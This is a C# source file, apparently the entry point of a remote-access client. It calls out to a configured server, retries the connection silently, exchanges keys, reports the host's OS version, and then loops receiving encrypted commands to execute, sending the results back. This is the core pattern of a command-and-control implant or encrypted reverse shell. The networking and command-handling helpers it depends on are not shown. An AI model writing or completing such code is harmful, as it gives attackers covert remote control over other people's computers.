using Client_side;
using System.Net.Sockets;
using System.Text;

public class Program
{
    public static Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    
    public static void Main()
    {
        // Handle the connection to the server when receive SocketException
        int retry = 1;
        CONNECT:
            try
            {
                NetworkLayer.Connect(Utils.IP, Utils.PORT);
            }
            catch (SocketException)
            {
                if (retry < 6)
                {
                    Thread.Sleep(1000 * retry);
                    retry++;
                    goto CONNECT;
                }
                Environment.Exit(0);
            }


        // Connect to the server and send the public key
        NetworkLayer.SendPublicKey();
        string passPhrase = NetworkLayer.ReceivePassPhrase();
        Encryptor encryptor = new(passPhrase.Trim());

        // Send OS Version
        string osVersion = Environment.OSVersion.ToString();
        NetworkLayer.SendResult(Encoding.UTF8.GetBytes(osVersion));

        // Loop to receive commands from the server and execute them then send the result back
        while (true)
        {
            try
            {
                byte[] command = NetworkLayer.ReceiveCommand();
                string decryptedCommand = encryptor.Decrypt(command);
                HandleCommand.ProcessCommand(decryptedCommand, encryptor);
            }
            catch (SocketException)
            {
                break;
            }
            catch (Exception e)
            {
                NetworkLayer.SendResult(e.Message);
            }
        }
        Environment.Exit(0);
    }
}